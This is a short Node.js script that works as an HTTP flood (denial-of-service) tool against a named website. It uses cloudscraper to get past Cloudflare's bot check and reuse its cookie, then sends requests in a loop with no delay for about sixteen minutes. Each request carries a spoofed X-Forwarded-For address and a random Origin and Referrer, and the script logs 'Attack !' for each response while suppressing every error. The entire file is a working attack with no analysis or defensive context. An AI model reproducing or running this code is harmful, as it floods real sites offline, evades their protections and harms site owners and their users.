var colors = require('colors');
const cloudscraper = require('cloudscraper');
const request = require('request');
const randomstring = require('randomstring');
function main_process(){
var cookie = '';
var useragent = '';
var color = [colors.green,colors.underline.red,colors.rainbow,colors.trap]
function main(){
var colors = color[Math.floor(Math.random()*color.length)];
cloudscraper.get('https://www.ufascr.win/',function(e,r,b){
if (e){
console.log('Error Connect')}
var parsed = JSON.parse(JSON.stringify(r));
useragent = (parsed['request']['headers']['User-Agent'])
cookie = (parsed['request']['headers']['cookie'])
//console.log(cookie,useragent)
var char = randomstring.generate({
length:10,
charset:'abcdefghijklmnopqstuvwxyz0123456789'
})
//console.log(char)
ipq = function ranip(){
return Math.round(Math.random()*256)
}
var ip = ipq()+'.'+ipq()+'.'+ipq()+'.'+ipq()
//console.log(ip)
var config = {
url:'https://www.ufascr.win/',
method:'get',
headers:{
'User-Agent': useragent,
'Upgrade-Insecure-Requests': '1',
'cookie': cookie,
'Origin': 'http://' + char + '.com',
'Referrer': 'http://google.com/' + char,
'X-Forwarded-For': ip
}
}
request(config,function(e,r){
console.log(colors(r.statusCode+" "+"Attack !"));
})
})
}
setInterval(()=>{main()})
setTimeout(()=>{process.exit()},1000000)
}
main_process()
process.on('uncaughtException', function(err) {
    
});

process.on('unhandledRejection', function(err) {
    
});
